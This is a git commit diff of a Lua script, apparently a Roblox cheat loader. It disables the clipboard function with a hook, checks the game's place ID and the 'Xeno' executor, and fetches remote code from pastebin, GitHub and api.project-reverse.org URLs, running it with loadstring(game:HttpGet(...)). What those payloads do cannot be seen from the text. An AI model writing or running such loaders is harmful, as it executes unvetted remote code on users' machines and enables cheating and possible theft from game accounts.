b0677a8e6478eecc3ddb14a5fa0d7fb3e65a39db
leonix <furkan62.bakir@gmail.com>
2026-06-12 16:35:22 +0300

    Update most.lua

--- most.lua
+++ most.lua
@@ -1,1 +1,21 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ld3sh94BLl/0", true))()
+pcall(hookfunction, setclipboard, function() return end)
+
+local placeId = game.PlaceId
+
+if placeId == 142823291 and identifyexecutor() == "Xeno" then 
+    local function farm()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/VR8xKo647Z/0'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/vss/refs/heads/main/vis.lua'))()
+end
+
+task.spawn(farm)
+task.spawn(loadui)
+end
+
+if placeId == 920587237 then
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
+elseif placeId == 142823291 then
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL21tMi5sdWEifX0"))()
+end
